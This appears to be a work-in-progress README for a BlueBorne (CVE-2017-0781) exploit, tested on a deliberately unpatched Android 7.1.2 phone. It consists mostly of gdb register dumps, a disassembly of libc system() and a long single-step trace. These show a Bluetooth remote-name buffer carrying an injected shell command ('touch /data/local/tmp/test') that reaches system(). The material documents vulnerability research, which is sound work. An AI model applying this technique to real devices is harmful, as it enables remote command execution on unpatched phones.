# android712-blueborne (Work in progress - dirty code)

For testing purposes removed the CVE-2017-0781 pathces and compiled 7.1.2 (LineageOS CM 14.1) on my Samsung S3 Neo+ GT-9301I

Android Blueborne RCE CVE-2017-0781


Control r4 register which is REMOTE_NAME

After dozen of executions got this condition in

```
(gdb) i r
r0             0x1700	5888
r1             0x1700	5888
r2             0xf41d564b	4095563339
r3             0x8	8
r4             0xacfb360c	2902144524
r5             0x1	1
r6             0xa7c0faa8	2814442152
r7             0x9a36a8d8	2587273432
r8             0x0	0
r9             0x9a36a4b0	2587272368
r10            0xa7c0f820	2814441504
r11            0xa7c0fab4	2814442164
r12            0x9a36a8d8	2587273432
sp             0x9a36a4a0	0x9a36a4a0
lr             0xb4cac361	-1261780127
pc             0xace761f6	0xace761f6 <btu_hci_msg_ready+62>
cpsr           0x600f0030	1611595824
fpscr          0x20000011	536870929
(gdb) x/10s 0xacfb360c  
0xacfb360c <btm_cb+288>:	"\"\027AACCCCM\213\315\264\f6\373\254CCCCM\213\315\264\";\ntouch /data/local/tmp/test\n#"
0xacfb3644 <btm_cb+344>:	""
0xacfb3645 <btm_cb+345>:	""
0xacfb3646 <btm_cb+346>:	""
0xacfb3647 <btm_cb+347>:	""
0xacfb3648 <btm_cb+348>:	""
0xacfb3649 <btm_cb+349>:	""
0xacfb364a <btm_cb+350>:	""
0xacfb364b <btm_cb+351>:	""
0xacfb364c <btm_cb+352>:	""
(gdb) disass 0xb4cd8b4d 
Dump of assembler code for function system:
   0xb4cd8b4c <+0>:	push	{r4, r5, r6, lr}
   0xb4cd8b4e <+2>:	sub	sp, #72	; 0x48
   0xb4cd8b50 <+4>:	ldr	r1, [pc, #236]	; (0xb4cd8c40 <system+244>)
   0xb4cd8b52 <+6>:	cmp	r0, #0
   0xb4cd8b54 <+8>:	ldr	r2, [pc, #236]	; (0xb4cd8c44 <system+248>)
   0xb4cd8b56 <+10>:	add	r1, pc
   0xb4cd8b58 <+12>:	ldr	r1, [r1, #0]
   0xb4cd8b5a <+14>:	add	r2, pc
   0xb4cd8b5c <+16>:	vld1.64	{d16-d17}, [r2]
   0xb4cd8b60 <+20>:	ldr	r1, [r1, #0]
   0xb4cd8b62 <+22>:	str	r1, [sp, #68]	; 0x44
   0xb4cd8b64 <+24>:	add	r1, sp, #48	; 0x30
   0xb4cd8b66 <+26>:	vst1.64	{d16-d17}, [r1]
   0xb4cd8b6a <+30>:	beq.n	0xb4cd8bf6 <system+170>
   0xb4cd8b6c <+32>:	add	r4, sp, #12
   0xb4cd8b6e <+34>:	str	r0, [sp, #56]	; 0x38
   0xb4cd8b70 <+36>:	mov	r0, r4
   0xb4cd8b72 <+38>:	blx	0xb4ca6a38 <sigemptyset@plt>
   0xb4cd8b76 <+42>:	mov	r0, r4
   0xb4cd8b78 <+44>:	movs	r1, #17
   0xb4cd8b7a <+46>:	blx	0xb4ca711c <sigaddset@plt>
   0xb4cd8b7e <+50>:	add	r2, sp, #8
---Type <return> to continue, or q <return> to quit---
   0xb4cd8b80 <+52>:	movs	r0, #0
   0xb4cd8b82 <+54>:	mov	r1, r4
   0xb4cd8b84 <+56>:	blx	0xb4ca65ac <sigprocmask@plt>
   0xb4cd8b88 <+60>:	blx	0xb4ca7a70 <vfork@plt>
   0xb4cd8b8c <+64>:	mov	r4, r0
   0xb4cd8b8e <+66>:	cmp.w	r4, #4294967295
   0xb4cd8b92 <+70>:	beq.n	0xb4cd8bfa <system+174>
   0xb4cd8b94 <+72>:	cmp	r4, #0
   0xb4cd8b96 <+74>:	beq.n	0xb4cd8c1e <system+210>
   0xb4cd8b98 <+76>:	add	r2, sp, #32
   0xb4cd8b9a <+78>:	movs	r0, #2
   0xb4cd8b9c <+80>:	movs	r1, #0
   0xb4cd8b9e <+82>:	blx	0xb4ca6a44 <sigaction@plt>
   0xb4cd8ba2 <+86>:	add	r2, sp, #16
   0xb4cd8ba4 <+88>:	movs	r0, #3
   0xb4cd8ba6 <+90>:	movs	r1, #0
   0xb4cd8ba8 <+92>:	blx	0xb4ca6a44 <sigaction@plt>
   0xb4cd8bac <+96>:	add	r5, sp, #4
   0xb4cd8bae <+98>:	movs	r6, #0
   0xb4cd8bb0 <+100>:	mov	r0, r4
   0xb4cd8bb2 <+102>:	mov	r1, r5
   0xb4cd8bb4 <+104>:	movs	r2, #0
   0xb4cd8bb6 <+106>:	blx	0xb4ca7aa0 <waitpid@plt>
---Type <return> to continue, or q <return> to quit---
   0xb4cd8bba <+110>:	cmp.w	r0, #4294967295
   0xb4cd8bbe <+114>:	bne.n	0xb4cd8bcc <system+128>
   0xb4cd8bc0 <+116>:	blx	0xb4ca651c <__errno@plt>
   0xb4cd8bc4 <+120>:	ldr	r0, [r0, #0]
   0xb4cd8bc6 <+122>:	cmp	r0, #4
   0xb4cd8bc8 <+124>:	beq.n	0xb4cd8bb0 <system+100>
   0xb4cd8bca <+126>:	movs	r6, #1
   0xb4cd8bcc <+128>:	add	r1, sp, #8
   0xb4cd8bce <+130>:	movs	r0, #2
   0xb4cd8bd0 <+132>:	movs	r2, #0
   0xb4cd8bd2 <+134>:	blx	0xb4ca65ac <sigprocmask@plt>
   0xb4cd8bd6 <+138>:	add	r1, sp, #32
   0xb4cd8bd8 <+140>:	movs	r0, #2
   0xb4cd8bda <+142>:	movs	r2, #0
   0xb4cd8bdc <+144>:	blx	0xb4ca6a44 <sigaction@plt>
   0xb4cd8be0 <+148>:	add	r1, sp, #16
   0xb4cd8be2 <+150>:	movs	r0, #3
   0xb4cd8be4 <+152>:	movs	r2, #0
   0xb4cd8be6 <+154>:	blx	0xb4ca6a44 <sigaction@plt>
   0xb4cd8bea <+158>:	ldr	r0, [sp, #4]
   0xb4cd8bec <+160>:	cmp	r6, #0
   0xb4cd8bee <+162>:	it	ne
   0xb4cd8bf0 <+164>:	movne.w	r0, #4294967295
---Type <return> to continue, or q <return> to quit---
   0xb4cd8bf4 <+168>:	b.n	0xb4cd8c08 <system+188>
   0xb4cd8bf6 <+170>:	movs	r0, #1
   0xb4cd8bf8 <+172>:	b.n	0xb4cd8c08 <system+188>
   0xb4cd8bfa <+174>:	add	r1, sp, #8
   0xb4cd8bfc <+176>:	movs	r0, #2
   0xb4cd8bfe <+178>:	movs	r2, #0
   0xb4cd8c00 <+180>:	blx	0xb4ca65ac <sigprocmask@plt>
   0xb4cd8c04 <+184>:	mov.w	r0, #4294967295
   0xb4cd8c08 <+188>:	ldr	r1, [pc, #68]	; (0xb4cd8c50 <system+260>)
   0xb4cd8c0a <+190>:	ldr	r2, [sp, #68]	; 0x44
   0xb4cd8c0c <+192>:	add	r1, pc
   0xb4cd8c0e <+194>:	ldr	r1, [r1, #0]
   0xb4cd8c10 <+196>:	ldr	r1, [r1, #0]
   0xb4cd8c12 <+198>:	subs	r1, r1, r2
   0xb4cd8c14 <+200>:	itt	eq
   0xb4cd8c16 <+202>:	addeq	sp, #72	; 0x48
   0xb4cd8c18 <+204>:	popeq	{r4, r5, r6, pc}
   0xb4cd8c1a <+206>:	blx	0xb4ca64f8 <__stack_chk_fail@plt>
   0xb4cd8c1e <+210>:	add	r1, sp, #8
   0xb4cd8c20 <+212>:	movs	r0, #2
   0xb4cd8c22 <+214>:	movs	r2, #0
   0xb4cd8c24 <+216>:	blx	0xb4ca65ac <sigprocmask@plt>
   0xb4cd8c28 <+220>:	ldr	r0, [pc, #28]	; (0xb4cd8c48 <system+252>)
---Type <return> to continue, or q <return> to quit---
   0xb4cd8c2a <+222>:	add	r1, sp, #48	; 0x30
   0xb4cd8c2c <+224>:	add	r0, pc
   0xb4cd8c2e <+226>:	ldr	r0, [r0, #0]
   0xb4cd8c30 <+228>:	ldr	r2, [r0, #0]
   0xb4cd8c32 <+230>:	ldr	r0, [pc, #24]	; (0xb4cd8c4c <system+256>)
   0xb4cd8c34 <+232>:	add	r0, pc
   0xb4cd8c36 <+234>:	blx	0xb4ca7b90 <execve@plt>
   0xb4cd8c3a <+238>:	movs	r0, #127	; 0x7f
   0xb4cd8c3c <+240>:	blx	0xb4ca6a50 <_exit@plt>
   0xb4cd8c40 <+244>:	strdeq	lr, [r3], -r10
   0xb4cd8c44 <+248>:	andeq	sp, r3, r2, lsr #17
   0xb4cd8c48 <+252>:	andeq	lr, r3, r0, asr #16
   0xb4cd8c4c <+256>:	andeq	pc, r2, r4, lsl #6
   0xb4cd8c50 <+260>:	andeq	lr, r3, r4, asr #16
End of assembler dump.
(gdb) stepi
[New LWP 16278]
0xace761f8	122	in system/bt/stack/./btu/btu_task.c
(gdb) i r
r0             0x1700	5888
r1             0xb4cd8b4d	3033369421
r2             0xf41d564b	4095563339
r3             0x8	8
r4             0xacfb360c	2902144524
r5             0x1	1
r6             0xa7c0faa8	2814442152
r7             0x9a36a8d8	2587273432
r8             0x0	0
r9             0x9a36a4b0	2587272368
r10            0xa7c0f820	2814441504
r11            0xa7c0fab4	2814442164
r12            0x9a36a8d8	2587273432
sp             0x9a36a4a0	0x9a36a4a0
lr             0xb4cac361	-1261780127
pc             0xace761f8	0xace761f8 <btu_hci_msg_ready+64>
cpsr           0x600f0030	1611595824
fpscr          0x20000011	536870929
(gdb) stepi
[New LWP 16317]
0xace761fa	122	in system/bt/stack/./btu/btu_task.c
(gdb) i r
r0             0xacfb360c	2902144524
r1             0xb4cd8b4d	3033369421
r2             0xf41d564b	4095563339
r3             0x8	8
r4             0xacfb360c	2902144524
r5             0x1	1
r6             0xa7c0faa8	2814442152
r7             0x9a36a8d8	2587273432
r8             0x0	0
r9             0x9a36a4b0	2587272368
r10            0xa7c0f820	2814441504
r11            0xa7c0fab4	2814442164
r12            0x9a36a8d8	2587273432
sp             0x9a36a4a0	0x9a36a4a0
lr             0xb4cac361	-1261780127
pc             0xace761fa	0xace761fa <btu_hci_msg_ready+66>
cpsr           0x600f0030	1611595824
fpscr          0x20000011	536870929
(gdb) stepi
[New LWP 16358]
0xb4cd8b4c in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b4e in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b50 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b52 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b54 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b56 in system () from target:/system/lib/libc.so
(gdb) 
[New LWP 16386]
0xb4cd8b58 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b5a in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b5c in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b60 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b62 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b64 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b66 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b6a in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b6c in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b6e in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b70 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b72 in system () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a38 in sigemptyset@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a3c in sigemptyset@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a40 in sigemptyset@plt () from target:/system/lib/libc.so
(gdb) 
0xb4cafe72 in sigemptyset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe74 in sigemptyset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe76 in sigemptyset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe78 in sigemptyset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe7a in sigemptyset () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b76 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b78 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b7a in system () from target:/system/lib/libc.so
(gdb) 
0xb4ca711c in sigaddset@plt () from target:/system/lib/libc.so
(gdb) 
[New LWP 16450]
0xb4ca7120 in sigaddset@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7124 in sigaddset@plt () from target:/system/lib/libc.so
(gdb) 
0xb4cafdf4 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafdf6 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafdf8 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafdfa in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafdfc in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafdfe in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe00 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe02 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe06 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe0a in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe0c in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe10 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe14 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe18 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe1a in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe1e in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cafe20 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b7e in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b80 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b82 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b84 in system () from target:/system/lib/libc.so
(gdb) 
0xb4ca65ac in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca65b0 in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca65b4 in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f40fbc in sigprocmask ()
(gdb) 
0xb6f40fc0 in sigprocmask ()
(gdb) 
0xb6f40fc2 in sigprocmask ()
(gdb) 
0xb6f40fc4 in sigprocmask ()
(gdb) 
0xb6f40fc6 in sigprocmask ()
(gdb) 
0xb6f40fc8 in sigprocmask ()
(gdb) 
0xb6f40fca in sigprocmask ()
(gdb) 
0xb6f40fcc in sigprocmask ()
(gdb) 
0xb6f40fce in sigprocmask ()
(gdb) 
0xb6f40fd0 in sigprocmask ()
(gdb) 
0xb6f40fd2 in sigprocmask ()
(gdb) 
0xb6f40fd4 in sigprocmask ()
(gdb) 
0xb6f40fd6 in sigprocmask ()
(gdb) 
0xb6f40fd8 in sigprocmask ()
(gdb) 
0xb6f40fda in sigprocmask ()
(gdb) 
0xb6f40fdc in sigprocmask ()
(gdb) 
0xb6f40fde in sigprocmask ()
(gdb) 
0xb6f40fe0 in sigprocmask ()
(gdb) 
0xb6f40fe2 in sigprocmask ()
(gdb) 
0xb6f40fe4 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 

0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 

0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 

0xb6f41004 in sigprocmask ()
(gdb) 

0xb6f40fe8 in sigprocmask ()
(gdb) 

0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40fec in sigprocmask ()
(gdb) 
0xb6f40fee in sigprocmask ()
(gdb) 
0xb6f40ff0 in sigprocmask ()
(gdb) 
0xb6f40460 in sigismember@plt ()
(gdb) 
0xb6f40464 in sigismember@plt ()
(gdb) 
0xb6f40468 in sigismember@plt ()
(gdb) 
0xb4cafea8 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafeaa in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafeac in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafeae in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafeb0 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafeb2 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafeb4 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafeb6 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafeba in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafebe in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafec0 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafec4 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafec8 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb4cafecc in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb6f40ff4 in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 

0xb6f41000 in sigprocmask ()
(gdb) 
[New LWP 16506]

0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 

0xb6f40fea in sigprocmask ()
(gdb) 

0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
